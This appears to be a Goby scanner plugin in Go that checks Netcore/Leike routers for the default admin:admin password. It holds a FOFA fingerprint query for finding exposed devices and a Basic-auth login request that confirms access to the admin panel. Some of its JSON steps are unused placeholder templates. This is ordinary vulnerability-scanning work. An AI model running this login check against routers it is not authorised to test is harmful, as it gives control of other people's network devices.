package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "netcore Router Default Password Vulnerability",
    "Description": "<p>Leike Broadband Router is a router device.</p><p>There is a default password of admin:admin in the background of Leike broadband router. Attackers can use the default password to log in to the background, seize administrator rights, and control the entire website.</p>",
    "Product": "netcore-Products",
    "Homepage": "http://www.netcoretec.com/",
    "DisclosureDate": "2023-08-10",
    "PostTime": "2023-08-10",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "header=\"Basic realm=\\\"NETCORE\" || banner=\"Basic realm=\\\"NETCORE\"",
    "GobyQuery": "header=\"Basic realm=\\\"NETCORE\" || banner=\"Basic realm=\\\"NETCORE\"",
    "Level": "3",
    "Impact": "<p>Attackers can use the default password to log in to the background, seize administrator privileges, and control the entire website.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "http://www.netcoretec.com/"
    ],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "磊科宽带路由器默认口令漏洞",
            "Product": "netcore-公司产品",
            "Description": "<p>磊科宽带路由器是一款路由器设备。<br></p><p>磊科宽带路由器后台存在默认口令 admin:admin，<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">攻击者可以使用默认密码登录后台，夺取管理员权限，控制整个网站。</span><br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可以使用默认密码登录后台，夺取管理员权限，控制整个网站。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "netcore Router Default Password Vulnerability",
            "Product": "netcore-Products",
            "Description": "<p>Leike Broadband Router is a router device.</p><p>There is a default password of admin:admin in the background of Leike broadband router. Attackers can use the default password to log in to the background, seize administrator rights, and control the entire website.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can use the default password to log in to the background, seize administrator privileges, and control the entire website.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10887"
}`

	sendPayloada764ac48a := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/")
		cfg.Header.Store("Authorization", "Basic YWRtaW46YWRtaW4=")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayloada764ac48a(u)
			if err != nil {
				return false
			}
			result := rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, "宽带路由器管理面板") && !strings.Contains(rsp.Utf8Html, "用户名或密码有误")
			if result {
				ss.VulURL = u.Scheme() + "://admin:admin@" + u.HostInfo
			}
			return result
		}, nil,
	))
}